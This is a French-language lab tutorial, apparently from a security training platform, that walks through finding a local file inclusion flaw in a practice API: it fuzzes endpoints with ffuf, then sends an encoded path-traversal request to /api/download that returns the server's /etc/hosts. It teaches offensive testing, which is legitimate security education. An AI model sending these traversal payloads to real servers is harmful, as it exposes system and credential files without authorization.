Inclusion de fichiers locaux (LFI)
==================================

* * * * *

L'inclusion de fichiers locaux (LFI) est une attaque qui affecte aussi bien les applications Web que les API. Il permet à un attaquant de lire des fichiers internes et parfois d'exécuter du code sur le serveur via une série de moyens, l'un étant `Apache Log Poisoning`. Notre module [d'inclusion de fichiers](https://academy.hackthebox.com/module/details/23) couvre LFI en détail.

Évaluons ensemble une API vulnérable à l'inclusion de fichiers locaux.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'API cible et suivez-la.

Supposons que nous évaluons une telle API résidant dans `http://<TARGET IP>:3000/api`.

Interagissons d'abord avec lui.

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3000/api
{"status":"UP"}

```

Nous ne voyons rien d'utile à part l'indication que l'API est opérationnelle. Effectuons le fuzzing des points de terminaison de l'API à l'aide *de ffuf* et de la liste [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) , comme suit.

```
dsgsec@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>:3000/api/FUZZ
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

:: Progress: [40/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors
download                [Status: 200, Size: 71, Words: 5, Lines: 1]
:: Progress: [87/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::
Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error::
Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

Il semble que `/api/download`ce soit un point de terminaison d'API valide. Interagissons avec lui.

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
{"success":false,"error":"Input the filename via /download/<filename>"}

```

Nous devons spécifier un fichier, mais nous n'avons aucune connaissance des fichiers stockés ou de leur schéma de nommage. Nous pouvons cependant essayer de monter une attaque Local File Inclusion (LFI).

```
dsgsec@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
127.0.0.1 localhost
127.0.1.1 nix01-websvc

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

L'API est en effet vulnérable à l'inclusion de fichiers locaux !
